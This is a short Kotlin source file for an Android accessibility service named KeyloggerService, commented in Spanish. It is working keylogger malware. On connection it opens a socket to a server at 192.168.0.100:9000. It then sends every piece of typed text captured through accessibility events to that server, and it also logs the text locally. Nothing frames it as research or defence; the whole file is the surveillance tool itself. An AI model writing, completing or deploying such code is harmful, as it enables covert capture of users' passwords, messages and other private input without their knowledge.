package com.example.logaction

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.PrintWriter
import java.net.Socket

class KeyloggerService : AccessibilityService() {
    private var socket: Socket? = null
    private var writer: PrintWriter? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            // Conectar al servidor
            socket = Socket("192.168.0.100", 9000) // IP del servidor y puerto
            writer = PrintWriter(socket!!.getOutputStream(), true)
            Log.d("KeyloggerService", "Conexión establecida con el servidor")
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e("KeyloggerService", "Error al conectar con el servidor", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event != null && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.toString()
            writer?.println("Teclado: $text") // Enviar los datos del teclado al servidor
            Log.d("KeyloggerService", "Tecla detectada: $text")
        }
    }

    override fun onInterrupt() {
        writer?.close()
        socket?.close()
    }
}
